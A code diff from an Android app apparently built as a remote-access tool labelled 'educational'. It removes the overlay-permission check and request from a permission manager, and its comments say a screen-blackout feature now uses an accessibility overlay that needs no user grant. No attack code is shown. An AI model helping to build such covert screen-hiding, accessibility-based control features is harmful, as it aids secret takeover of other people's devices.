@@ -88,15 +88,8 @@ public class PermissionManager {
                 }
             }
 
-            boolean overlayGranted = false;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                overlayGranted = Settings.canDrawOverlays(context);
-            }
-            JSONObject overlayItem = new JSONObject();
-            overlayItem.put("permission", "android.permission.SYSTEM_ALERT_WINDOW");
-            overlayItem.put("label", "Display Over Other Apps (Overlay)");
-            overlayItem.put("granted", overlayGranted);
-            if (overlayGranted) granted.put(overlayItem); else notGranted.put(overlayItem);
+            // SYSTEM_ALERT_WINDOW (overlay) permission removed — ScreenBlackout now uses
+            // TYPE_ACCESSIBILITY_OVERLAY which requires no special permission.
 
             boolean accessibilityGranted = com.remoteaccess.educational.services.UnifiedAccessibilityService.getInstance() != null;
             JSONObject accessItem = new JSONObject();
@@ -166,13 +159,7 @@ public class PermissionManager {
                 intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                 break;
 
-            case "android.permission.SYSTEM_ALERT_WINDOW":
-                // Opens the exact "Display over other apps" page for this app
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                            Uri.parse("package:" + pkg));
-                }
-                break;
+            // SYSTEM_ALERT_WINDOW removed — no longer needed (TYPE_ACCESSIBILITY_OVERLAY used instead)
 
             case "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS":
                 // Opens the battery optimization dialog directly for this app
